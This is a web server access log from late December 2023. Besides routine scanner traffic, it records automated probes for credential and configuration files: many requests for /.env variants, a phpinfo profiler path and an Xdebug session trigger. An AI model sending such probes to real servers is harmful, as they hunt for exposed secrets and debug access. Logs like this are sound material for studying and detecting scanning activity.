95.214.235.169 - - [25/Dec/2023:23:26:11 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:23:26:11 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.163.53 - - [25/Dec/2023:23:57:33 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [25/Dec/2023:23:57:53 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.33.87.154 - - [26/Dec/2023:00:01:48 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [26/Dec/2023:00:02:06 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
190.60.109.187 - - [26/Dec/2023:00:11:33 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
94.28.170.55 - - [26/Dec/2023:00:20:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.155.88.231 - - [26/Dec/2023:00:41:36 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.33.87.154 - - [26/Dec/2023:00:42:07 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.46 - - [26/Dec/2023:00:42:49 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.104 - - [26/Dec/2023:00:45:35 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.104.210.105 - - [26/Dec/2023:00:51:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [26/Dec/2023:00:52:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.245 - - [26/Dec/2023:01:03:00 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.46 - - [26/Dec/2023:01:03:14 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
78.153.140.219 - - [26/Dec/2023:01:12:17 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.219 - - [26/Dec/2023:01:12:18 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.97.73.87 - - [26/Dec/2023:01:18:22 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
85.215.154.243 - - [26/Dec/2023:01:51:44 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:51:48 +0000] "GET /.env.example HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:51:58 +0000] "GET /api/.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:06 +0000] "GET /API/.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:10 +0000] "GET /server/.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:21 +0000] "GET /_profiler/phpinfo HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:25 +0000] "GET /config.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:27 +0000] "GET /backend/.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:32 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
85.215.154.243 - - [26/Dec/2023:01:52:34 +0000] "GET /laravel/.env HTTP/1.1" 200 3230 "-" "python-requests/2.27.1"
54.36.115.221 - - [26/Dec/2023:02:10:35 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [26/Dec/2023:02:10:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
